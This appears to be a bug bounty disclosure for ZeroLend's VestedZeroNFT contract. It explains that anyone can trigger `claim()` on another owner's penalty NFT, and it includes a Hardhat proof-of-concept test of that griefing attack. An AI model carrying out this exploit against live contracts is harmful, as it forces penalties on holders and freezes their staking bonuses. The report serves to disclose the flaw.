# 29123 - \[SC - Medium] Griefing attack for VestedZeroNFT

Submitted on Mar 7th 2024 at 19:12:50 UTC by @DuckAstronomer for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29123

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/zerolend/governance>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
* Permanent freezing of funds

## Description

## Vulnerability Details

It is possible for anyone to call the `claim()` function of the `VestedZeroNFT` contract on behalf of the NFT owner. This poses an issue especially when an NFT is minted with `penalty=true`. In such cases, the NFT owner ends up paying a penalty (currently 50%) and loses the ability to utilize the `StakingBonus` contract.

This situation sets the stage for a Griefing attack scenario where an attacker can trigger `claim()` for NFTs with `penalty=true`. Consequently, the owners bear penalties and forfeit the opportunity to receive bonuses through the `StakingBonus` mechanism.

## References

* <https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L159>
* <https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L211>
* <https://github.com/zerolend/governance/blob/main/contracts/vesting/StakingBonus.sol#L74>
* <https://github.com/zerolend/governance/blob/main/contracts/locker/BaseLocker.sol#L333>

## Proof of Concept

To run the Poc put it's code to the `governance-main/test/Gauge.poc.ts` file, generate a random private key, and issue the following command:

```
WALLET_PRIVATE_KEY=0x... NODE_ENV=test npx hardhat test test/Gauge.poc.ts --config hardhat.config.ts --network hardhat
```

**PoC scenario**:

1. The deployer generates `VestedZeroNFT` with `penalty=true` to the Whale.
2. The Ant (attacker) quickly invokes `claim()` for the Whale's Nft.
3. As a result `50%` penalty is paid and now `unclaimed()` returns `0` for the Nft.
4. The Whale wants to transfer Nft to the `StakingBonus` contract, but their tx reverts since `unclaimed()` returns `0`.

```
import { expect } from "chai";
import { deployGovernance } from "./fixtures/governance";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { SignerWithAddress } from "@nomicfoundation/hardhat-ethers/signers";
import {
  LockerToken,
  OmnichainStaking,
  StakingBonus,
  VestedZeroNFT,
  ZeroLend,
} from "../typechain-types";
import { e18 } from "./fixtures/utils";

describe("Immunefi Boost", () => {
  let ant: SignerWithAddress;
  let whale: SignerWithAddress;
  let vest: VestedZeroNFT;
  let now: number;
  let stakingBonus: StakingBonus;
  let zero: ZeroLend;
  let locker: LockerToken;
  let omniStaking: OmnichainStaking;

  beforeEach(async () => {
    const deployment = await loadFixture(deployGovernance);
    ant = deployment.ant;
    zero = deployment.zero;
    vest = deployment.vestedZeroNFT;
    stakingBonus = deployment.stakingBonus;
    locker = deployment.lockerToken;
    omniStaking = deployment.omnichainStaking;
    now = Math.floor(Date.now() / 1000);
    whale = deployment.whale;
  });


  // Run as: WALLET_PRIVATE_KEY=0x... NODE_ENV=test npx hardhat test test/Griefing.poc.ts --config hardhat.config.ts --network hardhat


  describe("Griefing", () => {
    it("Ant attacks Whale", async () => {
      expect(await vest.lastTokenId()).to.equal(0);

      // deployer should be able to mint a nft for Whale
      // with penalty = True
      await vest.mint(
        whale.address,
        e18 * 20n, // 20 ZERO linear vesting
        0, // 0 ZERO upfront
        1000, // linear duration - 1000 seconds
        0, // cliff duration - 0 seconds
        now + 1000, // unlock date
        true, // penalty!!
        0
      );

      expect(await vest.lastTokenId()).to.equal(1);

      // Ant calls claim() for minted Nft with penalty
      // Nft is minted for Whale
      await vest.connect(ant).claim(1);
      
      // Whale transfers Nft to StakingBonus contract
      // But it reverts
      await expect(
        vest
          .connect(whale)
          ["safeTransferFrom(address,address,uint256)"](
            whale.address,
            stakingBonus.target,
            1
        )
      ).to.be.reverted;
    });
  });
});
```
